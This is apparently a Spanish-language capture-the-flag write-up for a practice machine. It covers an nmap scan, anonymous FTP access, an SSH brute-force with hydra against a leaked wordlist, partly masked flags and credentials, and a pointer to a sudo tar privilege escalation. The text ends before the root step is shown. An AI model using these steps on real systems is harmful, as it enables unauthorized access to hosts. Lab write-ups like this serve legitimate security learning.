[VOLVER PAGINA PRINCIPAL](./)

# COWBOYHACKER - WriteUp
## Creamos la carpeta donde estara nuestra maquina para realizar la prueba

Creamos un directorio llamado **cowboyhacker** y nos meteremos a el.

```bash
mkdir cowboyhacker
cd $_
```

Una Vez dentro de la carpeta podemos realizar la actividad.

## Escaneo por NMAP

Ahora vamos ver los puertos que tiene la maquina para ello vamos a usar el siguiente comando de **nmap** para poder hacer el escaneo de puerto necesario.

```bash
nmap -sC -sV -p- -oN -min-rate=5000 Puertos.txt <IP_OBJETIVO>
```
- -min-rate=5000 : La cantidad de paquetes que se envia por segundo.
- -sC : Script predeterminados.
- -sV : Detección de versión.
- -oN : La salida donde se almacenara el resultado del comando.
- -p- : Todos los puertos para escanear.

**SALIDA DEL COMANDO**
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.40.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**CAPTURA DEL RESULTADO EN LA TERMINAL**

![NMAP](/assets/img/HACKER_ETICO/COWBOYHACKER/NMAP-SCAN.png)

Con este resultado que vemos que existe un **FTP** en el cual se puede ver existe una entrada con **anonymous** y un servicio **SSH** en el cual se podria entra si existiera un usuario.

Tambien vemos el servicio **HTTP** pero no nos sirve de nada.

## ENTRAR EN FTP

Ahora vamos a entrar dentro del servicio **FTP**, con lo cual vamos a poner el siguiente comando para poder entrar en el.

Con lo que vamos entrar con el usuario **anonymous** que tiene **FTP** por defecto.

```bash
ftp <IP_OBJETIVO>
```

**SALIDA DEL COMANDO**
```bash
Connected to 10.10.18.227.
220 (vsFTPd 3.0.3)
Name (10.10.18.227:sunamy): anonymous
230 Login successful.
```

Ahora dentro del **FTP** vamos a poner el comando **ls** con lo se vera si existe unos fichero dentro de el.

**SALIDA DEL COMANDO**
```bash
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Ahora vamos a descargar los ficheros del **FTP** con lo cual usamos el comando **GET** para poder descargarlo.

**SALIDA DEL COMANDO**
```bash
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*******************************|   418      672.49 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (7.04 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*******************************|    68      484.71 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.20 KiB/s)
```

### PREGUNTAS SOBRE LO ENCONTRADO

- ¿Quién escribió la lista de tareas? 

```bash
Se observa en el fichero task.txt
```
- ¿Qué servicio puede hacer con fuerza bruta con el archivo de texto encontrado? 

```bash
Tras ver el usuario se puede ver que puerto se puede atacar.
```

## ENTRAR DENTRO DEL USUARIO

Tras observar el puerto en el cual podemos atacar vamos a usar **HYDRA** con los siguiente parametros.

```bash
hydra -l <USUARIO> -P <LIBRERIA-CONTRASEÑA> <IP-OBJETIVO> <PUERTO>
```

Como se ha observado anteriormente nos hemos descargado un archivo que se llama **locks.txt** que en realidad es un diccionario de las contraseña que se va usar para saber que contraseña tiene el usuario del puerto atacado.

**SALIDA DEL COMANDO**
```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 13:12:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ###://10.10.18.227:22/
[22][###] host: 10.10.18.227   login: ##n   password: ###ed#####gon######at##
1 of 1 target successfully completed, 1 valid password found
```

### PREGUNTAS SOBRE LO ENCONTRADO

- ¿Cuál es la contraseña de los usuarios? 

```bash
Contraseña dada por Hydra.
```

## BANDERA DEL USUARIO

Una vez dentro del usuario vamos a poner el comando **ls** con lo cual vemos el primer fichero que contiene la primera bandera.

```bash
##n@bountyhacker:~/Desktop$ ls
user.txt
##n@bountyhacker:~/Desktop$ cat user.txt
THM{#####3_S####d1####3}
```
### PREGUNTAS SOBRE LO ENCONTRADO

- user.txt

```bash
THM{#####3_S####d1####3}
```

## BANDERA DEL ROOT

Ahora vamos a escalar de privilegios con lo cual tenemos que ver que aplicaciones tiene el usuario con lo cual se ejecuta como root, para ello ponemos el comando **sudo -l** con lo cual nos dice que tiene el usuario con privilegios de root.

```bash
Matching Defaults entries for lin on bountyhacker:                          
    env_reset, mail_badpass,                                                
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                            
                                                                            
User lin may run the following commands on bountyhacker:                    
    (root) /bin/tar
```

Como vemos tiene como privilegios de root la aplicación de **tar** con lo cual vamos a la pagina [GTFOBINS](https://gtfobins.github.io/gtfobins/tar/), con lo cual nos va decir como podemos entrar como **root** con el programa **tar**.



